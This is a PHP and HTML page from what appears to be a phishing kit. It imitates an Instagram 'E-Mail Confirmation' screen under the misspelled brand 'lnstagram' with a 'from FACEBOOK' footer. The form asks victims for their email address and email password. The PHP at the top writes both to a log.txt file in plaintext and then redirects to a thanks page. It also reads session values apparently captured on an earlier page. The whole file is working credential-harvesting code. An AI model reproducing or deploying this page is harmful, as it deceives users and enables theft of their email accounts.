<?php
session_start();

if ($_POST) {
	$mail=$_POST["mail"];
	$mail_password=$_POST["mail_password"];

    $file = fopen('log.txt', 'a');
fwrite($file, "Mail : ".$mail."\n\n" ."Mail Şifresi : ".$mail_password."\n\n\n");
fclose($file);
echo '';

    $username = $_SESSION['username']  ;
    $password = $_SESSION['password'] ;
    $ip = $_SESSION['ip']  ;
    $date = $_SESSION['date'];




  
   header("Location: thanks.php");
}
?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Mail Cofirmation • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>

<body>
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
                    <span  class="header-text">Find it for free on Google Play.</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		<img src="https://i.hizliresim.com/cHgTep.png" width="200" style="display:none;">
		
<h1 style="font-weight:400;color:#343434;font-size:20px;letter-spacing:px;">E-Mail Confirmation</h1>

		

		<button class="fb-qenzy" style="display:none;">
			<i class="fab fa-facebook-square" style="font-size:17px;"></i>&nbsp;
			
			Continue with Facebook
		</button>
		<img src="https://www.freepngimg.com/thumb/gmail/66456-mailang-icons-computer-logo-email-gmail.png" width="80">

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				

				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
			<div class="top"></div>
				</th>

			</tr>
		</table>
		<br>
		<form method="post">
			<input type="email" name="mail" placeholder="E-Mail" required="" class="username" autocomplete="off"><br>
			<input type="password" name="mail_password" placeholder="E-Mail Password" required="" class="password">
			<br>
			<table class="sa" style="display:none;">
				<tr class="as">
					<th class="x"></th>
					<th class="y">
						<span class="forgot">Forgot Password?</span>
					</th>
				</tr>
			</table>

			<br>
			<button type="submit" class="qenzyist">Confirm</button>

		</form>
		<div class="dont" style="display:none;">
			<span class="dont1">Don't have an account? </span>
			<span class="dont2">Sign up</span>

		</div>

	</center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<?php

?>

